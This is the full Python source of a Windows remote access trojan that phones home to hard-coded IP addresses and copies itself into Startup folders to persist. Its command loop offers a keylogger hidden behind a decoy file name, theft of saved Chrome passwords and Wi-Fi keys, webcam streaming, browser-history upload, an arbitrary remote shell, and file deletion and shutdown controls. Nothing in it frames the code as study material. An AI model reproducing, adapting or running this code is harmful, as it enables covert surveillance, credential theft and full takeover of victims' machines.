import os, socket, getpass, cv2, pickle, struct, platform, psutil, logging, threading, shutil, win32api, win32gui, win32con, sqlite3, win32crypt, getpass, time, ctypes, subprocess, browserhistory, signal
from shutil import copy2, move
from pynput.keyboard import Key, Listener, Controller

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
logging.basicConfig()
cap = cv2.VideoCapture(0)

def on_press(key):
    logging.info(key)
    logs = open(r'C:\Users\Public\Windows Registry.txt', 'a+')
    logs.write(str(key))
    
def keylogger():
    with Listener(on_press=on_press) as listener:
        s.send('logging keystrokes'.encode())
        listener.join()

def getpath():
    if os.name == "nt":
            # This is the Windows Path
            PathName = os.getenv('USERPROFILE') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
            if (os.path.isdir(PathName) == False):
                dont = 'Chrome does not exist'
                return dont
    return PathName

def dump():
    info_list = []
    path = getpath()
    if path == 'Chrome does not exist':
        dont = 'Chrome does not exist'
        return dont
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()
        for information in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({'origin_url': information[0], 'username': information[1], 'password': str(password)})
            elif os.name == 'posix':
                info_list.append({'origin_url': information[0], 'username': information[1], 'password': information[2]})
        return str(info_list)
    except sqlite3.OperationalError as e:
            e = str(e)
            if (e == 'database is locked'):
                s.send('Chrome is running in the background'.encode())
            elif (e == 'no such table: logins'):
                s.send("Couldn't find table inside database".encode())
            elif (e == 'unable to open database file'):
                s.send('Wrong database path'.encode())

webcam_port = 6970
def webcam():
    global webcam_port
    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            r.connect(('127.0.0.1', webcam_port))
            break
        except:
            try:
                r.connect(('203.212.130.174', webcam_port))
                #s.connect(('122.107.241.76', 6969))
                break
            except:
                pass
    webcam_port += 1
    timeout = 9999999999999999 #runs for 9 quadrillion seconds (31,688,087 years)
    timeout_start = time.time()
    cap = cv2.VideoCapture(0)
    try:
        while time.time() < timeout_start + timeout:
            ret, frame = cap.read()
            data = pickle.dumps(frame)
            r.sendall(struct.pack("L", len(data)) + data)
        cap.release()
    except:
        cap.release()

history_port = 6968
def history_dump():
    global history_port
    n = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            n.connect(('127.0.0.1', history_port))
            break
        except:
            try:
                n.connect(('203.212.130.174', history_port))
                #n.connect(('122.107.241.76', history_port))
                break
            except:
                pass
    history_port -= 1
    try:
        browserhistory.write_browserhistory_csv()
        file = open('chrome_history.csv', 'r+', encoding="utf8")
        n.sendall(file.read().encode())
        file.close()
        os.remove('chrome_history.csv')
    except Exception as err:
        n.send(f'Could not dump browser history\n{err}')

backdoor = False
logger = False
google = False
def main():
    global backdoor, logger, google
    while True:
        start = ['C:\\Users\\firef\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
        'C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
        os.environ.get('USERPROFILE') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup']
        for x in range(3):
            try:
                copy2(os.getcwd() + '\\Payload.exe', start[x])
                backdoor = True
                break
            except:
                pass
        while True:
            try:
                s.connect(('127.0.0.1', 6969))
                break
            except:
                try:
                    s.connect(('203.212.130.174', 6969))
                    #s.connect(('122.107.241.76', 6969))
                    break
                except:
                    pass
        prev_dir = ''
        while True:
            recv = s.recv(61440).decode()
            if recv == 'ls' or recv == 'dir':
                ls = str(os.listdir())
                rem = ls.replace('[', '')
                rem2 = rem.replace(']', '')
                rem3 = rem2.replace("'", "")
                rem4 = rem3.replace(",", """
""")
                ls = rem4
                if ls == '':
                    s.send('Nothing inside directory'.encode())
                else:
                    s.send(f"""Files in {os.getcwd()}\n             {ls}""".encode())
            elif recv == 'cd':
                s.send('Specify direcrory'.encode())
                recv = s.recv(61440).decode()
                try:
                    os.chdir(recv)
                    s.send(f'Changed directory to {recv}'.encode())
                except:
                    s.send(f'Could not change directory'.encode())
            elif recv == 'cd ..':
                try:
                    os.chdir('..')
                    s.send(f'Changed directory to {os.getcwd()}'.encode())
                except:
                    s.send('Could not change dirctory'.encode())
            elif recv == 'cat':
                s.send('Specify file'.encode())
                recv = s.recv(61440).decode()
                try:
                    file = open(recv, 'r+')
                    if file.read() == '':
                        s.send('File is empty'.encode())
                    else:
                        s.send(file.read().encode())
                except:
                    s.send('Could not read file'.encode())
            elif recv == 'webcam':
                s.send('Recording...'.encode())
                t1 = threading.Thread(target=webcam)
                t1.start()
            elif recv == 'info':
                drives = win32api.GetLogicalDriveStrings()
                drives = str(drives.split('\000')[:-1])
                drives1 = drives.replace('[', '')
                drives2 = drives1.replace(']', '')
                drives3 = drives2.replace("'", '')
                drives4 = drives3.replace('\\\\', '\\')
                s.send(f"""
OS: {platform.system()}
User: {getpass.getuser()}
ip
Drives: {drives4}
Backdoor installed: {backdoor}
Keylogger started: {logger}
Dumped Chrome Passwords: {google}
Current Payload Directory: {os.getcwd()}""".encode())
            elif recv == 'ps':
                for proc in psutil.process_iter(attrs=['pid', 'name', 'username']):
                    proc = str(proc)
                    proc1 = proc.replace('psutil.Process(', '')
                    s.send(f'\n{str(proc)}'.encode())
            elif recv == 'kill':
                s.send('Name of process'.encode())
                recv = s.recv(61440).decode()
                try:
                    os.kill(int(recv), signal.SIGSTOP)
                    s.send('Killed process successfully'.encode())
                except Exception as err:
                    s.send(f'Could not kill process\n{err}'.encode())
            elif recv == 'open':
                s.send('Specify file to open'.encode())
                recv = s.recv(61440).decode()
                try:
                    os.startfile(recv)
                    s.send(f'Opened {recv}'.encode())
                except:
                    s.send('Could not open file'.encode())
            elif recv == 'keylogger start':
                logger = True
                t1 = threading.Thread(target=keylogger)
                t1.start()
            elif recv == 'keylogger dump':
                try:
                    logs = open(r'C:\Users\Public\Windows Registry.txt', 'r+')
                    message = logs.read()
                    if message == '':
                        s.send('No keystrokes recorded'.encode())
                    else:
                        message1 = message.replace("'", "")
                        message2 = message1.replace('Key.enter', '<enter>')
                        message3 = message2.replace('Key.alt_lKey.tab', '')
                        message4 = message3.replace('Key.space', ' ')
                        message5 = message4.replace('Key.shift', '<shift>')
                        message6 = message5.replace('backspaceKey', '<backspace>')
                        message7 = message6.replace('Key.enterKey.', '')
                        message8 = message7.replace('Key.ctrl_l.', '<ctrl>')
                        message9 = message8.replace('leftKey.', '<left arrow>')
                        message10 = message9.replace('upKey.', 'up arrow')
                        message11 = message10.replace('downKey.', '<down arrow>')
                        message12 = message11.replace('rightKey.', '<right arrow>')
                        message13 = message12.replace('Key.tabKey.', '<tab>')
                        message14 = message13.replace('.', '')
                        message15 = message14.replace('Keycmd', '<windows key>')
                        message16 = message15.replace('Keycaps_lock', '<caps lock>')
                        message17 = message16.replace('Key', '')
                        message18 = message17.replace('Keyalt_l', '<alt>')
                        message19 = message18.replace('Keyalt_r', '<alt>')
                        message20 = message19.replace('Keyctrl_r', '<alt>')
                        message21 = message20.replace('caps_lock', '<caps lock>')
                        message22 = message21.replace('alt_l', '<alt>')
                        message = message22
                        s.send(message.encode())
                    logs.close()
                except:
                    s.send('Could not dump logs'.encode())
            elif recv == 'keylogger clear':  
                logs = open(r'C:\Users\Public\Windows Registry.txt', 'w+')
                logs.write('')
                s.send('Cleared logs'.encode())
            elif recv == 'rename':
                s.send('Specify file'.encode())
                file = s.recv(61440).decode()
                s.send('Specify new name of file'.encode())
                recv = s.recv(61440).decode()
                try:
                    os.rename(file, recv)
                    s.send('Renamed File Successfullly'.encode())
                except:
                    s.send(f'Failed to rename file {recv}'.encode())
            elif recv == 'rm':
                s.send('Specify name of file'.encode())
                recv = s.recv(61440).decode()
                try:
                    os.remove(recv)
                    s.send('Successfully removed file'.encode())
                except:
                    s.send('Could not remove file'.encode())
            elif recv == 'copy':
                s.send('Specify file'.encode())
                copy = s.recv(61440).decode()
                s.send('Specifiy destination of file'.encode())
                recv = s.recv(61440).decode()
                try:
                    copy2(copy, recv)
                    s.send('Copied file successfully'.encode())
                except:
                    s.send('Could not copy file'.encode())
            elif recv == 'cut':
                s.send('Specify file'.encode())
                cut = s.recv(61440).decode()
                s.send('Specifiy destination of file'.encode())
                recv = s.recv(61440).decode()
                try:
                    move(cut, recv)
                    s.send('Cut file successfully'.encode())
                except:
                    s.send('Could not cut file'.encode())
            elif recv == 'restart':
                try:
                    os.system('shutdown /r /t 0')
                    s.send('Restarted computer'.encode())
                except Exception as err:
                    s.send(f'Could not restart computer\n{err}')
            elif recv == 'shutdown':
                try:
                    os.system('shutdown /p')
                except Exception as err:
                    s.send(f'Could not shutdown computer\n{err}')
            elif recv == 'keyboard press':
                s.send('Specify keys to press'.encode())
                recv = s.recv(61440).decode()
                keyboard = Controller()
                try:
                    keyboard.press(recv)
                    keyboard.release(recv)
                    s.send(f'Pressed {recv}'.encode())
                except:
                    s.send(f'Failed to press {recv}'.encode())
            elif recv == 'keyboard type':
                s.send('Specify keys to type'.encode())
                recv = s.recv(61440).decode()
                keyboard = Controller()
                try:
                    keyboard.type(recv)
                    s.send(f'Typed {recv}'.encode())
                except:
                    s.send(f'Failed to type {recv}'.encode())
            elif recv == 'backdoor':
                prev_dir = os.getcwd()
                try:
                    os.chdir(start[0])
                except:
                    try:
                        os.chdir(start[1])
                    except:
                        try:
                            os.chdir(start[2])
                        except:
                            s.send('Could not find startup directory'.encode())
                ls = str(os.listdir())
                rem = ls.replace('[', '')
                rem2 = rem.replace(']', '')
                rem3 = rem2.replace("'", "")
                rem4 = rem3.replace(",", """
                """)
                ls = rem4
                s.send(f"""Files in {os.getcwd()}\n       {ls}""".encode())
            elif recv == 'startup':
                s.send(start[2].encode())
            elif recv == 'mkdir':
                s.send('Name of directory'.encode())
                recv = s.recv(61440).decode()
                try:
                    os.mkdir(recv)
                    s.send('Made directory Successfully'.encode())
                except Exception as err:
                    s.send(f'Could not make directory\n{err}'.encode())
            elif recv == 'backdoor install':
                s.send('File to backdoor'.encode())
                recv = s.recv(61440).decode()
                try:
                    copy2(recv, start[0])
                    backdoor = True
                    s.send('Backdoored file successfully'.encode())
                except:
                    try:
                        copy2(recv, start[1])
                        s.send('Backdoored file successfully'.encode())
                    except:
                        try:
                            copy2(recv, start[2])
                            s.send('Backdoored file successfully'.encode())
                        except:
                            s.send('Could not backdoor file'.encode())
            elif recv == 'pwd':
                s.send(os.getcwd().encode())
            elif recv == 'prevdir':
                if prev_dir == '':
                    s.send('Prevdir is empty'.encode())
                else:
                    try:
                        os.chdir(prev_dir)
                        s.send(f'Changed directory to {prev_dir}'.encode())
                    except:
                        s.send('Could not change directory'.encode())
            elif recv == 'shutdown /':
                s.send('Specify parameter'.encode())
                recv = s.recv(61440).decode()
                try:
                    os.system('shutdown ' + recv)
                except:
                    s.send('Could not parse parameter'.encode())
            elif recv == 'rmdir':
                s.send('Specify directory'.encode())
                recv = s.recv(61440).decode()
                try:
                    shutil.rmtree(recv)
                    s.send('Successfully removed directory'.encode())
                except:
                    s.send('Could not remove directory'.encode())
            elif recv == 'drives':
                drives = win32api.GetLogicalDriveStrings()
                drives = str(drives.split('\000')[:-1])
                drives1 = drives.replace('[', '')
                drives2 = drives1.replace(']', '')
                drives3 = drives2.replace("'", '')
                drives4 = drives3.replace('\\\\', '\\')
                s.send(str(drives4).encode())
            elif recv == 'display off':
                try:
                    win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
                    s.send('Turned off display'.encode())
                except Exception as err:
                    s.send(f'Could not turn off display\n{err}'.encode())
            elif recv == 'display on':
                try:
                    keyboard = Controller()
                    keyboard.press(Key.esc)
                    keyboard.release(Key.esc)
                    s.send('Turned on display'.encode())
                except:
                    s.send('Could not turn on display'.encode())
            elif recv == 'lock':
                try:
                    ctypes.windll.user32.LockWorkStation()
                    s.send('Locked computer'.encode())
                except Exception as err:
                    s.send(f'Could not lock computer\n{err}'.encode())
            elif recv == 'edit':
                s.send('Specify file name'.encode())
                file_name = s.recv(61440).decode()
                try:
                    file2 = open(file_name, 'r+')
                    if file2.read() == '':
                        s.send('File is empty')
                    else:
                        s.send(file2.read().encode())
                        file2.close()
                        recv = s.recv(61440).decode()
                        file2 = open(file_name, 'w')
                        file2.write(recv)
                        file2.close()
                        s.send('Successfully wrote to file'.encode())
                except:
                    s.send('Failed to edit file'.encode())
            elif recv == 'google dump':
                google = True
                if str(dump()) == 'None':
                    pass
                else:
                    s.send(str(dump()).encode())
            elif recv == 'shell':
                s.send('Dropped into shell'.encode())
                while True:
                    recv = s.recv(61440).decode()
                    if recv == 'exit':
                        s.send('Exiting...'.encode())
                        break
                    try:
                        os.system(recv)
                        s.send('Successfully executed command'.encode())
                    except:
                        s.send('Could not execute command'.encode())
            elif recv == 'find':
                s.send('File to find'.encode())
                recv = s.recv(61440).decode()
                if recv == 'cancel':
                    s.send('Canceled'.encode())
                else:
                    result = []
                    for root, dirs, files in os.walk(os.getcwd()):
                        if recv in files:
                            result.append(os.path.join(root, recv))
                    if str(result).replace(',', """
""").replace('[', '').replace(']', '').replace("'", '').replace('\\\\', '\\') == '':
                        s.send('\nNo files found'.encode())
                    else:
                        s.send(str(result).replace(',', """
    """).replace('[', '').replace(']', '').replace("'", '').replace('\\\\', '\\').replace('     ', '').encode())
            elif recv == 'wifi dump':
                try:
                    a = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
                    a = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
                    passwords = []
                    for i in a:
                        try:
                            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
                            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                            try:
                                passwords.append("{:<30}|  {:<}".format(i, results[0]))
                            except IndexError: 
                                passwords.append("{:<30}|  {:<}".format(i, ""))
                        except:
                            pass
                except Exception as err:
                    s.send(f'Could not dump passwords\n{err}'.encode())
                s.send(str(passwords).encode())
            elif recv == 'history dump':
                history_dump()
            elif recv == 'exit':
                s.send('Hacking the mainframe. . .'.encode())
                exit()
            elif recv == 'help':
                s.send("""
File system commands:
cd
cd ..
dir or ls
drives
cat
pwd
mkdir
remove
remove dir
copy
cut
rename
find
edit
startup

System commands:
open
info
restart
shutdown
shutdown -h
lock
display off
display on
shell
ps (buggy)
kill (doesn't work)

Payload commands:
backdoor
prevdir
backdoor install
webcam
keylogger start
keylogger dump
keylogger clear
wifi dump
google dump
history dump
keyboard type
keyboard press
exit
                """.encode())
            elif recv == 'shutdown -h':
                s.send("""
Usage: shutdown [/i | /l | /s | /sg | /r | /g | /a | /p | /h | /e | /o] [/hybrid] [/soft] [/fw] [/f]
[/m \\computer][/t xxx][/d [p|u:]xx:yy [/c "comment"]]

No args    Display help. This is the same as typing /?.
/?         Display help. This is the same as not typing any options.
/i         Display the graphical user interface (GUI).
        This must be the first option.
/l         Log off. This cannot be used with /m or /d options.
/s         Shutdown the computer.
/sg        Shutdown the computer. On the next boot, if Automatic Restart Sign-On
        is enabled, automatically sign in and lock last interactive user.
        After sign in, restart any registered applications.
/r         Full shutdown and restart the computer.
/g         Full shutdown and restart the computer. After the system is rebooted,
        if Automatic Restart Sign-On is enabled, automatically sign in and
        lock last interactive user.
        After sign in, restart any registered applications.
/a         Abort a system shutdown.
        This can only be used during the time-out period.
        Combine with /fw to clear any pending boots to firmware.
/p         Turn off the local computer with no time-out or warning.
        Can be used with /d and /f options.
/h         Hibernate the local computer.
        Can be used with the /f option.
/hybrid    Performs a shutdown of the computer and prepares it for fast startup.
        Must be used with /s option.
/fw        Combine with a shutdown option to cause the next boot to go to the
        firmware user interface.
/e         Document the reason for an unexpected shutdown of a computer.
/o         Go to the advanced boot options menu and restart the computer.
        Must be used with /r option.
/m \\computer Specify the target computer.
/t xxx     Set the time-out period before shutdown to xxx seconds.
        The valid range is 0-315360000 (10 years), with a default of 30.
        If the timeout period is greater than 0, the /f parameter is
        implied.
/c "comment" Comment on the reason for the restart or shutdown.
        Maximum of 512 characters allowed.
/f         Force running applications to close without forewarning users.
        The /f parameter is implied when a value greater than 0 is
        specified for the /t parameter.
/d [p|u:]xx:yy  Provide the reason for the restart or shutdown.
        p indicates that the restart or shutdown is planned.
        u indicates that the reason is user defined.
        If neither p nor u is specified the restart or shutdown is
        unplanned.
        xx is the major reason number (positive integer less than 256).
        yy is the minor reason number (positive integer less than 65536).
    """.encode())
            else:
                s.send(f"'{recv}' is not a command".encode())
main()